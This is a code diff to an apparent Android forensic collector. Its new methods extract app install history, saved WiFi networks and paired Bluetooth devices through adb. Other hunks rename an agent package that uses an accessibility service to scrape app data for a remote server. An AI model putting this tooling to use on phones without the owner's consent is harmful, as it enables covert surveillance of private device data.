+        jsonl_content = '\n'.join(json.dumps(r, ensure_ascii=False) for r in records)
+        local_path.write_text(jsonl_content, encoding='utf-8')
+
+        sha256 = hashlib.sha256(jsonl_content.encode('utf-8')).hexdigest()
+
+        logger.info(
+            f"[AppInstallHistory] Collected {len(records)} app records"
+        )
+
+        yield str(local_path), {
+            'artifact_type': artifact_type,
+            'filename': filename,
+            'size': local_path.stat().st_size,
+            'sha256': sha256,
+            'record_count': len(records),
+            'device_serial': self.device_info.serial,
+            'device_model': self.device_info.model,
+            'android_version': self.device_info.android_version,
+            'collected_at': datetime.utcnow().isoformat(),
+            'collection_method': 'pm_dump',
+            'root_used': False,
+        }
+
+    def _collect_wifi_history(
+        self,
+        artifact_type: str,
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract saved WiFi networks and connection history.
+
+        Parses dumpsys wifi output for configured networks including
+        SSID, security type, and last connected timestamps.
+
+        Output: wifi_history.jsonl (one JSON object per line)
+        """
+        if progress_callback:
+            progress_callback("[Non-Root] Collecting WiFi connection history")
+
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+
+        # Collect full dumpsys wifi output
+        cmd = 'dumpsys wifi'
+        output, rc = self._adb_shell(cmd)
+
+        if rc != 0 or not output or not output.strip():
+            logger.warning("[WiFiHistory] Failed to collect dumpsys wifi")
+            yield '', {
+                'artifact_type': artifact_type,
+                'status': 'error',
+                'error': 'Failed to collect WiFi information',
+            }
+            return
+
+        # Save raw dumpsys wifi output
+        raw_filename = f"wifi_dumpsys_{timestamp}.txt"
+        raw_path = output_dir / raw_filename
+        raw_path.write_text(output, encoding='utf-8', errors='replace')
+
+        raw_sha256 = hashlib.sha256(
+            output.encode('utf-8', errors='replace')
+        ).hexdigest()
+
+        yield str(raw_path), {
+            'artifact_type': artifact_type,
+            'source': 'wifi_dumpsys_raw',
+            'filename': raw_filename,
+            'size': raw_path.stat().st_size,
+            'sha256': raw_sha256,
+            'device_serial': self.device_info.serial,
+            'device_model': self.device_info.model,
+            'android_version': self.device_info.android_version,
+            'collected_at': datetime.utcnow().isoformat(),
+            'collection_method': 'dumpsys_wifi',
+            'root_used': False,
+        }
+
+        # Parse configured networks from dumpsys wifi output
+        # Look for ConfiguredNetworks or WifiConfigStore sections
+        networks = []
+        current_network = {}
+        in_config_section = False
+
+        for line in output.split('\n'):
+            stripped = line.strip()
+
+            # Detect start of configured networks section
+            if 'ConfiguredNetworks' in stripped or 'WifiConfigStore' in stripped:
+                in_config_section = True
+                continue
+
+            if not in_config_section:
+                continue
+
+            # Detect end of section (empty line or new section header)
+            if stripped == '' and current_network:
+                if 'ssid' in current_network:
+                    networks.append(current_network)
+                current_network = {}
+                continue
+
+            # Parse network fields
+            if 'SSID' in stripped and '=' in stripped:
+                val = stripped.split('=', 1)[1].strip().strip('"')
+                if val:
+                    current_network['ssid'] = val
+            elif 'BSSID' in stripped and '=' in stripped:
+                val = stripped.split('=', 1)[1].strip()
+                if val and val != 'any':
+                    current_network['bssid'] = val
+            elif 'KeyMgmt' in stripped or 'security' in stripped.lower():
+                val = stripped.split('=', 1)[1].strip() if '=' in stripped else stripped
+                current_network['security_type'] = val
+            elif 'lastConnected' in stripped or 'lastUpdated' in stripped:
+                val = stripped.split('=', 1)[1].strip() if '=' in stripped else stripped
+                key = 'last_connected' if 'lastConnected' in stripped else 'last_updated'
+                current_network[key] = val
+            elif 'status' in stripped.lower() and '=' in stripped:
+                val = stripped.split('=', 1)[1].strip()
+                current_network['status'] = val
+
+        # Flush last network if pending
+        if current_network and 'ssid' in current_network:
+            networks.append(current_network)
+
+        if networks:
+            jsonl_filename = f"wifi_history_{timestamp}.jsonl"
+            jsonl_path = output_dir / jsonl_filename
+
+            jsonl_content = '\n'.join(
+                json.dumps(n, ensure_ascii=False) for n in networks
+            )
+            jsonl_path.write_text(jsonl_content, encoding='utf-8')
+
+            jsonl_sha256 = hashlib.sha256(jsonl_content.encode('utf-8')).hexdigest()
+
+            logger.info(f"[WiFiHistory] Parsed {len(networks)} saved networks")
+
+            yield str(jsonl_path), {
+                'artifact_type': artifact_type,
+                'source': 'wifi_parsed',
+                'filename': jsonl_filename,
+                'size': jsonl_path.stat().st_size,
+                'sha256': jsonl_sha256,
+                'network_count': len(networks),
+                'device_serial': self.device_info.serial,
+                'collected_at': datetime.utcnow().isoformat(),
+                'collection_method': 'wifi_history_parsed',
+                'root_used': False,
+            }
+        else:
+            logger.debug("[WiFiHistory] No configured networks parsed from dumpsys output")
+
+    def _collect_bluetooth_history(
+        self,
+        artifact_type: str,
+        output_dir: Path,
+        progress_callback: Optional[Callable[[str], None]]
+    ) -> Generator[Tuple[str, Dict[str, Any]], None, None]:
+        """
+        Extract Bluetooth paired devices and connection history.
+
+        Parses dumpsys bluetooth_manager output for bonded devices
+        including device name, MAC address, device type, and bond state.
+
+        Output: bluetooth_history.jsonl (one JSON object per line)
+        """
+        if progress_callback:
+            progress_callback("[Non-Root] Collecting Bluetooth pairing history")
+
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+
+        # Collect dumpsys bluetooth_manager
+        cmd = 'dumpsys bluetooth_manager'
+        output, rc = self._adb_shell(cmd)
+
+        if rc != 0 or not output or not output.strip():
+            logger.warning("[BTHistory] Failed to collect dumpsys bluetooth_manager")
+            yield '', {
+                'artifact_type': artifact_type,
+                'status': 'error',
+                'error': 'Failed to collect Bluetooth information',
+            }
+            return
+
+        # Save raw dumpsys bluetooth_manager output
+        raw_filename = f"bluetooth_dumpsys_{timestamp}.txt"
+        raw_path = output_dir / raw_filename
+        raw_path.write_text(output, encoding='utf-8', errors='replace')
+
+        raw_sha256 = hashlib.sha256(
+            output.encode('utf-8', errors='replace')
+        ).hexdigest()
+
+        yield str(raw_path), {
+            'artifact_type': artifact_type,
+            'source': 'bluetooth_dumpsys_raw',
+            'filename': raw_filename,
+            'size': raw_path.stat().st_size,
+            'sha256': raw_sha256,
+            'device_serial': self.device_info.serial,
+            'device_model': self.device_info.model,
+            'android_version': self.device_info.android_version,
+            'collected_at': datetime.utcnow().isoformat(),
+            'collection_method': 'dumpsys_bluetooth',
+            'root_used': False,
+        }
+
+        # Parse bonded/paired devices from bluetooth_manager output
+        devices = []
+        current_device = {}
+        in_bonded_section = False
+
+        for line in output.split('\n'):
+            stripped = line.strip()
+
+            # Detect bonded devices section
+            if ('Bonded devices' in stripped or 'bonded devices' in stripped
+                    or 'Paired devices' in stripped):
+                in_bonded_section = True
+                continue
+
+            # Detect device entry by MAC address pattern (XX:XX:XX:XX:XX:XX)
+            mac_match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', stripped)
+            if mac_match:
+                # Save previous device if exists
+                if current_device and 'mac_address' in current_device:
+                    devices.append(current_device)
+                current_device = {'mac_address': mac_match.group(1)}
+                # Check if device name follows on same line
+                remainder = stripped.replace(mac_match.group(1), '').strip(' -:')
+                if remainder:
+                    current_device['device_name'] = remainder
+                continue
+
+            if not current_device:
+                continue
+
+            # Parse device attributes
+            if 'name' in stripped.lower() and '=' in stripped:
+                val = stripped.split('=', 1)[1].strip().strip('"')
+                if val:
+                    current_device['device_name'] = val
+            elif 'deviceType' in stripped or 'device_type' in stripped:
+                val = stripped.split('=', 1)[1].strip() if '=' in stripped else stripped
+                current_device['device_type'] = val
+            elif 'bondState' in stripped or 'bond_state' in stripped:
+                val = stripped.split('=', 1)[1].strip() if '=' in stripped else stripped
+                current_device['bond_state'] = val
+            elif 'BluetoothClass' in stripped or 'deviceClass' in stripped:
+                val = stripped.split('=', 1)[1].strip() if '=' in stripped else stripped
+                current_device['device_class'] = val
+            elif 'uuids' in stripped.lower() and '=' in stripped:
+                val = stripped.split('=', 1)[1].strip()
+                current_device['uuids'] = val
+
+        # Flush last device
+        if current_device and 'mac_address' in current_device:
+            devices.append(current_device)
+
+        if devices:
+            jsonl_filename = f"bluetooth_history_{timestamp}.jsonl"
+            jsonl_path = output_dir / jsonl_filename
+
+            jsonl_content = '\n'.join(
+                json.dumps(d, ensure_ascii=False) for d in devices
+            )
+            jsonl_path.write_text(jsonl_content, encoding='utf-8')
+
+            jsonl_sha256 = hashlib.sha256(jsonl_content.encode('utf-8')).hexdigest()
+
+            logger.info(f"[BTHistory] Parsed {len(devices)} paired devices")
+
+            yield str(jsonl_path), {
+                'artifact_type': artifact_type,
+                'source': 'bluetooth_parsed',
+                'filename': jsonl_filename,
+                'size': jsonl_path.stat().st_size,
+                'sha256': jsonl_sha256,
+                'device_count': len(devices),
+                'device_serial': self.device_info.serial,
+                'collected_at': datetime.utcnow().isoformat(),
+                'collection_method': 'bluetooth_history_parsed',
+                'root_used': False,
+            }
+        else:
+            logger.debug("[BTHistory] No paired devices parsed from dumpsys output")
 
     # ======================================================================
     # System ADB Helpers (for shell/pull fallback and external storage)
@@ -5261,7 +5173,7 @@ class AndroidCollector:
     # Agent APK 경로 (collector/resources/agent_apk/)
     AGENT_APK_PATH = Path(__file__).parent.parent.parent / 'resources' / 'agent_apk' / 'ForensicAgent.apk'
     AGENT_APK_VERSION_PATH = Path(__file__).parent.parent.parent / 'resources' / 'agent_apk' / 'version.txt'
-    AGENT_PACKAGE = 'com.aidf.agent'
+    AGENT_PACKAGE = 'com.unjaena.agent'
     AGENT_RECEIVER = f'{AGENT_PACKAGE}/.receiver.CommandReceiver'
 
     # Polling interval for scraping completion (seconds)
@@ -5391,7 +5303,7 @@ class AndroidCollector:
 
             self._enable_accessibility_service(progress_callback)
 
-            # Step 3: Get installed apps for recipe matching (서버에서 지원 목록 동적 조회)
+            # Step 3: Get installed apps for collection profile matching (서버에서 지원 목록 동적 조회)
             supported_packages = self._get_supported_packages()
             if not supported_packages:
                 yield '', {
@@ -5418,7 +5330,7 @@ class AndroidCollector:
                 yield '', {
                     'artifact_type': artifact_type,
                     'status': 'error',
-                    'error': 'Failed to create scraping session (server unreachable or no recipes)',
+                    'error': 'Failed to create scraping session (server unreachable or no collection profiles available)',
                 }
                 return
 
@@ -5427,11 +5339,11 @@ class AndroidCollector:
 
             if not available_apps:
                 if progress_callback:
-                    progress_callback('No recipes available for installed apps')
+                    progress_callback('No collection profiles available for installed apps')
                 yield '', {
                     'artifact_type': artifact_type,
                     'status': 'skipped',
-                    'error': 'No scraping recipes available for installed apps',
+                    'error': 'No collection profiles available for installed apps',
                 }
                 return
 
@@ -5775,13 +5687,13 @@ class AndroidCollector:
         then read it via adb shell cat.
         """
         try:
-            AGENT_PKG = getattr(self, 'AGENT_PACKAGE', 'com.aidf.agent')
+            AGENT_PKG = getattr(self, 'AGENT_PACKAGE', 'com.unjaena.agent')
             AGENT_FP_PATH = f'/sdcard/Android/data/{AGENT_PKG}/files/device_fingerprint.txt'
 
             # Trigger Agent to write fingerprint
             cmd = (
                 'am broadcast '
-                '-a com.aidf.agent.ACTION_GET_FINGERPRINT '
+                '-a com.unjaena.agent.ACTION_GET_FINGERPRINT '
                 f'-n {self.AGENT_RECEIVER}'
             )
             self._adb_shell(cmd)
@@ -5832,7 +5744,7 @@ class AndroidCollector:
         self._adb_shell(f'mkdir -p {shlex.quote(token_dir)}')
         self._adb_shell(f"echo {shlex.quote(scraping_token)} > {shlex.quote(token_path)}")
 
-        # Agent APK appends /scraping/recipes, /scraping/status to server_url.
+        # Agent APK appends /scraping/profiles, /scraping/status to server_url.
         # Server routes are at /api/v1/collector/scraping/*, so we pass the
         # base URL including the prefix so Agent hits the correct endpoints.
         agent_server_url = f"{server_url.rstrip('/')}/api/v1/collector"
@@ -5840,7 +5752,7 @@ class AndroidCollector:
         # Send broadcast to CommandReceiver (토큰은 파일로 전달, broadcast에 미포함)
         cmd = (
             f'am broadcast '
-            f'-a com.aidf.agent.ACTION_START_SCRAPING '
+            f'-a com.unjaena.agent.ACTION_START_SCRAPING '
             f'-n {self.AGENT_RECEIVER} '
             f'--es server_url {shlex.quote(agent_server_url)} '
             f'--es session_id {shlex.quote(session_id)} '
@@ -5896,12 +5808,12 @@ class AndroidCollector:
             except Exception:
                 pass
 
-            # Check Agent logcat for fatal errors (recipe download failure, crash, etc.)
+            # Check Agent logcat for fatal errors (profile download failure, crash, etc.)
             try:
                 logcat_out, _ = self._adb_shell(
                     f'logcat -d -t 20 -s RecipeExecutor RecipeDownloader 2>/dev/null'
                 )
-                if logcat_out and ('Failed to download recipes' in logcat_out
+                if logcat_out and ('Failed to download collection profiles' in logcat_out
                                    or 'FATAL EXCEPTION' in logcat_out):
                     _debug_print(f'[SCRAPE] Agent error detected in logcat')
                     if progress_callback:
